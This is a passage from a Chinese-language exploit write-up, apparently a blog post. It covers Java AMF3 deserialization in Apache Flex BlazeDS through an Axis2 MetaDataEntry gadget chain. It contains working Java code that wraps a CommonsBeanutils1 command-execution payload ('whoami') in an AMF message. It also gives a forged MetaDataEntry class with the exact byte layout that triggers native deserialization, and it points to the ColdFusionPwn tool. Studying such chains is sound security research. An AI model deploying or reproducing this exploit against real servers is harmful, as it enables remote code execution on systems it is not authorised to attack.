(属性长度) 
        int i4 = readUInt29(dis); 
        System.out.println("readTraits:"+i4); 
        boolean externalizable = ((i4 & 4) == 4); 
        boolean dynamic = ((i4 & 8) == 8); 
        int count = (i4 >> 4); /* uint29 */ 
        //读取 1byte,小于 128 则直接返回,该字节右移 1 位,除以 2,表示类名长度. 
        int len = readUInt29(dis); 
        System.out.println("类名长度:"+(len>>1)); 
        //根据读取类名长度,读取类名,len>>1 字节,MetaDataEntry 利用链类名 35 字
节 
        byte[] bytearr = new byte[len>>1]; 
        dis.readFully(bytearr, 0, len>>1); 
        System.out.println("类名:" + new String(bytearr)); 
        //********************************************************** 
        System.out.println(" 以 下 是 利 用 链 数 据 , 流 中 剩 余 数 据 交 给 利 用 链 的
readExternal 方法处理"); 
        //********************************************************** 
        //MetaDataEntry 类序列化 ID,8 字节 
        long suid = dis.readLong(); 
        System.out.println("序列化 ID:"+suid); 
        //revID=2,4 字节 
        int revID = dis.readInt(); 
        System.out.println("revID:"+revID); 
        //isActive,1字节,必须为true,代码中会取反为false,否则直接return null; 
        boolean isActive = dis.readBoolean(); 
        System.out.println("isActive:"+isActive); 
        //isObjectForm,1 字节,必须为 false, 
        //代码中不会走默认的 readobject 方法, 
        //会将流中剩余数据再次封装为 ObjectInputStream,并调用 readObject 方法 
        boolean isObjectForm = dis.readBoolean(); 
        System.out.println("isObjectForm:"+isObjectForm); 
        //java 原生反序列化对象长度,4 字节 
        int size = dis.readInt(); 
        System.out.println("size:"+size); 
        System.out.println(dis.readByte());//ac 
        System.out.println(dis.readByte());//ed 
        System.out.println(dis.readByte());//00 
        System.out.println(dis.readByte());//05 
    } 
    public static  int readUInt29(DataInputStream in) throws IOException 
    { 
        int value; 
        // Each byte must be treated as unsigned 
        int b = in.readByte() & 0xFF; 
        if (b  
            org.apache.flex.blazeds 
            flex-messaging-core 
            4.7.2 
            org.apache.flex.blazeds 
            flex-messaging-common 
            4.7.2 
就可以在代码中，使用 AmfMessageSerializer 序列化数据 
Main.java 代码： 
//MetaDataEntry 利用链 
        CommonsBeanutils1 cb = new CommonsBeanutils1(); 
        Object cb_object = cb.getObject("whoami"); 
        MetaDataEntry metaDataEntry = new MetaDataEntry(cb_object); 
        ByteArrayOutputStream baos = new ByteArrayOutputStream(); 
        SerializationContext context = new SerializationContext(); 
        AmfTrace trace = new AmfTrace(); 
        AmfMessageSerializer seri = new AmfMessageSerializer(); 
        seri.initialize(context, baos, trace); 
        ActionMessage message = new ActionMessage(); 
        MessageBody body = new MessageBody(); 
        body.setData(metaDataEntry); 
        message.addBody(body); 
        seri.writeMessage(message); 
        byte[] bytes = baos.toByteArray(); 
        baos.close(); 
使用 AmfMessageSerializer 序列化消息，当调用 writeMessage 方法时，会对 message 对象
版本进行判断； 
ActionMessage 默认版本是 3 
调用 writeMessage 时，会设置 avmPlus 为 true 
后续调用到 Amf0Output 类中的 writeObject 方法中 
writeMessage—>writeBody—>writeObject 
Amf0Output 类中的 writeObject 方法中判断 avmPlus 布尔值为 true 时，会使用 Amf3Output
封装输出流，并调用 Amf3Output 类的 writeObject 方法 
注意 out.writeByte(kAvmPlusObjectType);流中写了个 17，kAvmPlusObjectType 值为 17 
Amf3Output 类的 writeObject 方法中判断对象类型，如果是 Externalizable 实现类，调用当
前类的 writeCustomObject 方法 
writeCustomObject 方法中，对 messageBody 对象进行判空、对象类型进行判断 
判断条件都不成立，将会进入 774 行部分的代码逻辑， 
注意 out.write(kObjectType);又向输出流中写了个 10，kObjectType 值为 10 
同时 if 判断中，对 byReference 方法返回值进行取反判断，方法返回值要求为 false 
byReference 方法，通过方法注释了解到，只是用来缓存对象的，我们第一次进入该方法，
返回值为一定是 false 
If 判断成立，将会调用当前类的 writePropertyProxy 方法： 
flex/messaging/io/amf/Amf3Output.java 文件中 790 行定义 writePropertyProxy 方法 
writeObjectTraits 方法不是主要执行流程，就不再深入分析 
通过 845 行位置了解到，在 MetaDataEntry 利用链中，最终将会调用 MetaDataEntry 类的
writeExternal 方法； 
通过 MetaDataEntry 利用链分析得知，在 readExternal 方法中，会以此读取： 
8 字节 long 类型的序列化 ID，必须为 8978361069526299875L 
4 字节 int 类型修订版本，必须为 2 
1 字节 boolean 类型 isActive，必须为 true 
1 字节 boolean 类型 isObjectForm，必须为 false 
4 字节 int 类型 size，后续 java 对象长度 
//。。。java 反序列化 payload 
axis2-kernel-1.8.0.jar 中 MetaDataEntry 的 writeExternal 方法不满足要求要求了，需要自己
写一个 MetaDataEntry 类 
MetaDataEntry.java,注意 package 
package org.apache.axis2.util; 
import java.io.*; 
public class MetaDataEntry implements Externalizable { 
    private Object payload; 
    private static final long serialVersionUID = 8978361069526299875L; 
    private static final int REVISION_2 = 2; 
    private static final int revisionID = 2; 
    public MetaDataEntry(Object payload){ 
        this.payload = payload; 
    } 
    public void writeExternal(ObjectOutput o) throws IOException { 
        ByteArrayOutputStream bout = new ByteArrayOutputStream(); 
        ObjectOutputStream oout = new ObjectOutputStream(bout); 
        oout.writeObject(payload); 
        byte[] bytes = bout.toByteArray(); 
        o.writeLong(serialVersionUID); 
        o.writeInt(2); 
        o.writeBoolean(true); 
        o.writeBoolean(false); 
        o.writeInt(bytes.length); 
        o.write(bytes); 
        o.writeObject(null); 
        o.writeObject(null); 
        o.writeObject(null); 
    } 
    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException 
{ 
        // we don't care 
    } 
} 
参考： 
好神秘的大师傅，博客文章质量非常高 
https://www.mi1k7ea.com/2019/12/07/Java-AMF3 反序列化漏洞/ 
AMF 反序列化利用代码，从这里抄来的，工具非常好用，但 java-cp 方式执行有点麻烦，可
以自己下载源码，添加 ysoserial 依赖重新打包，使用更方便 
https://github.com/codewhitesec/ColdFusionPwn